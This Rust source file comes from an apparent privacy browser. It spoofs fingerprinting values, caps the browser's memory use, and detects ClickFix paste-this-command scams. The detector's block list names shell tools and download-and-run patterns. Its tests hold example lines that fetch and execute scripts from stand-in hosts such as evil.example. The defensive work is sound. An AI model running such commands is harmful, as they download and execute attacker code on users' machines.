//! Protection for the user and their PC: fingerprint resistance (a script that runs before any
//! page code), a uniform browser identity, and a memory guard so a heavy site can't freeze Windows.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// The identity every RustWolf reports: the most common desktop browser, so users blend in.
pub const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36";

/// Runs at the start of every page, before the page's own scripts.
pub fn fingerprint_script(seed: u32) -> String {
    format!(
        r#"(() => {{
  const SEED = {seed};
  const def = (proto, key, get) => {{ try {{ Object.defineProperty(proto, key, {{ get, configurable: true }}); }} catch (e) {{}} }};
  // Same answers for everyone: hide the real CPU, memory, languages and platform.
  def(Navigator.prototype, 'hardwareConcurrency', () => 4);
  def(Navigator.prototype, 'deviceMemory', () => 8);
  def(Navigator.prototype, 'language', () => 'en-US');
  def(Navigator.prototype, 'languages', () => Object.freeze(['en-US', 'en']));
  def(Navigator.prototype, 'platform', () => 'Win32');
  def(Navigator.prototype, 'vendor', () => 'Google Inc.');
  def(Navigator.prototype, 'maxTouchPoints', () => 0);
  // Privacy signals.
  def(Navigator.prototype, 'globalPrivacyControl', () => true);
  def(Navigator.prototype, 'doNotTrack', () => '1');
  // The screen is reported as the window size: no real resolution or multi-monitor setup.
  if (typeof Screen !== 'undefined') {{
    def(Screen.prototype, 'width', () => window.innerWidth);
    def(Screen.prototype, 'height', () => window.innerHeight);
    def(Screen.prototype, 'availWidth', () => window.innerWidth);
    def(Screen.prototype, 'availHeight', () => window.innerHeight);
    def(Screen.prototype, 'colorDepth', () => 24);
    def(Screen.prototype, 'pixelDepth', () => 24);
  }}
  // Canvas fingerprinting: add tiny invisible noise (different every session) to read-backs.
  const noise = (data) => {{
    let s = SEED;
    for (let i = 0; i < data.length; i += 4) {{
      s = (s * 1103515245 + 12345) >>> 0;
      if ((s & 31) === 0) {{ data[i] ^= (s >>> 8) & 1; data[i + 1] ^= (s >>> 9) & 1; }}
    }}
  }};
  if (typeof CanvasRenderingContext2D !== 'undefined') {{
    const gid = CanvasRenderingContext2D.prototype.getImageData;
    CanvasRenderingContext2D.prototype.getImageData = function (...a) {{
      const img = gid.apply(this, a);
      try {{ noise(img.data); }} catch (e) {{}}
      return img;
    }};
  }}
  if (typeof HTMLCanvasElement !== 'undefined') {{
    const noisy = (canvas) => {{
      try {{
        const c = document.createElement('canvas');
        c.width = canvas.width; c.height = canvas.height;
        const x = c.getContext('2d');
        x.drawImage(canvas, 0, 0);
        if (c.width && c.height) x.putImageData(x.getImageData(0, 0, c.width, c.height), 0, 0);
        return c;
      }} catch (e) {{ return canvas; }}
    }};
    const tdu = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function (...a) {{ return tdu.apply(noisy(this), a); }};
    if (HTMLCanvasElement.prototype.toBlob) {{
      const tb = HTMLCanvasElement.prototype.toBlob;
      HTMLCanvasElement.prototype.toBlob = function (...a) {{ return tb.apply(noisy(this), a); }};
    }}
  }}
  // Battery and other sensors: not available.
  try {{ delete Navigator.prototype.getBattery; }} catch (e) {{}}
}})();"#
    )
}

fn total_ram_mb() -> u64 {
    use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
    unsafe {
        let mut m: MEMORYSTATUSEX = std::mem::zeroed();
        m.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut m) != 0 {
            m.ullTotalPhys / (1024 * 1024)
        } else {
            8192
        }
    }
}

fn own_ram_mb() -> u64 {
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        if K32GetProcessMemoryInfo(GetCurrentProcess(), &mut c, c.cb) != 0 {
            (c.WorkingSetSize / (1024 * 1024)) as u64
        } else {
            0
        }
    }
}

/// Last resort: Windows refuses RustWolf more than half of the PC's memory. If a page still
/// gets there, RustWolf closes instead of the whole PC freezing.
pub fn hard_memory_cap() {
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JOB_OBJECT_LIMIT_JOB_MEMORY, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOB_OBJECT_LIMIT_PROCESS_MEMORY, JOB_OBJECT_LIMIT_BREAKAWAY_OK,
    };
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if job.is_null() {
            return;
        }
        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        // Each process (the browser and every page process) gets at most 20% of the RAM,
        // and all of RustWolf together at most 40%.
        // BREAKAWAY_OK lets "Restart RustWolf" start the new copy outside this job.
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_JOB_MEMORY | JOB_OBJECT_LIMIT_PROCESS_MEMORY | JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE | JOB_OBJECT_LIMIT_BREAKAWAY_OK;
        info.ProcessMemoryLimit = (total_ram_mb() * 20 / 100 * 1024 * 1024) as usize;
        info.JobMemoryLimit = (total_ram_mb() * 40 / 100 * 1024 * 1024) as usize;
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, &info as *const _ as *const _, std::mem::size_of_val(&info) as u32);
        AssignProcessToJobObject(job, GetCurrentProcess());
        // The job handle stays open for RustWolf's whole life.
    }
}

/// Working set of one process, in MB.
fn process_ram_mb(pid: u32) -> Option<u64> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::ProcessStatus::{K32GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
        if h.is_null() {
            return None;
        }
        let mut c: PROCESS_MEMORY_COUNTERS = std::mem::zeroed();
        c.cb = std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32;
        let ok = K32GetProcessMemoryInfo(h, &mut c, c.cb) != 0;
        CloseHandle(h);
        ok.then(|| (c.WorkingSetSize / (1024 * 1024)) as u64)
    }
}

/// RustWolf's page processes (children of this process).
fn page_processes() -> Vec<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
    let me = std::process::id();
    let mut out = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                if e.th32ParentProcessID == me {
                    out.push(e.th32ProcessID);
                }
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

fn kill(pid: u32) {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
    unsafe {
        let h = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !h.is_null() {
            TerminateProcess(h, 1);
            CloseHandle(h);
        }
    }
}

/// Soft limit: a page process passing ~25% of the PC's memory is stopped at once (only that page);
/// in single-process mode the busiest page is closed instead.
pub struct MemoryGuard {
    pub limit_mb: u64,
    pub current_mb: Arc<AtomicU64>,
    /// Size of the last page process the guard stopped (0 = none).
    pub killed_mb: Arc<AtomicU64>,
}

impl MemoryGuard {
    pub fn start(wake: impl Fn() + Send + 'static) -> Self {
        let limit_mb = (total_ram_mb() / 6).clamp(1024, 2048);
        let current = Arc::new(AtomicU64::new(0));
        let killed = Arc::new(AtomicU64::new(0));
        let c = current.clone();
        let k = killed.clone();
        std::thread::Builder::new()
            .name("memory-guard".into())
            .spawn(move || loop {
                std::thread::sleep(Duration::from_millis(250));
                for pid in page_processes() {
                    if let Some(mb) = process_ram_mb(pid) {
                        if mb > limit_mb {
                            kill(pid);
                            k.store(mb, Ordering::Relaxed);
                            wake();
                        }
                    }
                }
                let mb = own_ram_mb();
                c.store(mb, Ordering::Relaxed);
                if mb > limit_mb {
                    wake();
                }
            })
            .ok();
        Self { limit_mb, current_mb: current, killed_mb: killed }
    }

    pub fn over(&self) -> bool {
        self.current_mb.load(Ordering::Relaxed) > self.limit_mb
    }
}

/// ClickFix protection: does this text look like a command a scam page wants you to paste into
/// Win+R / PowerShell / a terminal? (Normal copied text never matches.)
pub fn looks_like_command(text: &str) -> bool {
    let t = text.to_lowercase();
    let t = t.trim();
    if t.is_empty() {
        return false;
    }
    const STRONG: &[&str] = &[
        "powershell", "pwsh", "mshta", "rundll32", "regsvr32", "wscript", "cscript", "certutil", "bitsadmin",
        "invoke-expression", "invoke-webrequest", "invoke-restmethod", "downloadstring", "downloadfile",
        "frombase64string", "-encodedcommand", "start-process", "new-object net.webclient", "add-mppreference",
        "set-mppreference", "schtasks", "forfiles", "conhost", "cmd.exe", "cmd /c", "cmd /k", "%comspec%",
        "msiexec /i http", "msiexec /q", "curl -s", "| iex", "|iex", "| sh", "|sh", "| bash", "|bash",
        "osascript", "chmod +x", "base64 -d", "/dev/tcp/",
    ];
    if STRONG.iter().any(|k| t.contains(k)) {
        return true;
    }
    // Short aliases only count as words at the start of a command (avoids normal sentences).
    let first = t.split_whitespace().next().unwrap_or("");
    if ["iex", "iwr", "irm", "curl", "wget", "msiexec", "explorer", "cmd", "start", "net", "reg"].contains(&first)
        && (t.contains("http") || t.contains('\\') || t.contains(" /") || t.contains(" -"))
    {
        return true;
    }
    // Typical ClickFix decoy comment: "# ✅ I am not a robot - Verification ID: 1234".
    if t.contains('#') && (t.contains("not a robot") || t.contains("verification id") || t.contains("captcha")) {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::looks_like_command as c;
    #[test]
    fn clickfix() {
        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # ✅ I am not a robot - Verification ID: 4821"));
        assert!(c("mshta https://evil.example/verify.hta"));
        assert!(c("cmd /c start /min powershell -enc SQBFAFgA"));
        assert!(c("curl -s http://x.example/a.sh | bash"));
        assert!(!c("Hello, here is my email address"));
        assert!(!c("https://example.com/article?id=3"));
        assert!(!c("The command line is a text interface."));
    }
}
